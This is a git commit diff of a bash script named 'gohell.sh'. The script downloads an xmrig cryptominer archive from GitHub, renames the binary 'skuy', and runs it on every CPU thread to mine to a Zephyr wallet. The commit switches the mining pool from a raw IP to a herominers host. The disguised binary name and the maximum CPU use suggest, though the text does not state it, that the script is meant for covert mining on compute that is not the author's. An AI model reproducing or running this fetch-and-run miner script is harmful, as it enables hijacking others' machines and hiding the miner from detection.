a766c079160d9dcc49008baf2a51c0297c762970
nandafiku <156932477+nandafiku@users.noreply.github.com>
2024-01-22 10:09:26 +0700

    Update gohell.sh

--- gohell.sh
+++ gohell.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz
 mv xmrig skuy
-./skuy --donate-level 1 -o 149.28.143.100:443 -u ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 -p $(echo $(shuf -i 1-30000 -n 1)-AJG) -a rx/0 -t $(nproc --all)
+./skuy --donate-level 1 -o de.zephyr.herominers.com:1123 -u ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 -p $(echo $(shuf -i 1-30000 -n 1)-AJG) -a rx/0 -t $(nproc --all)
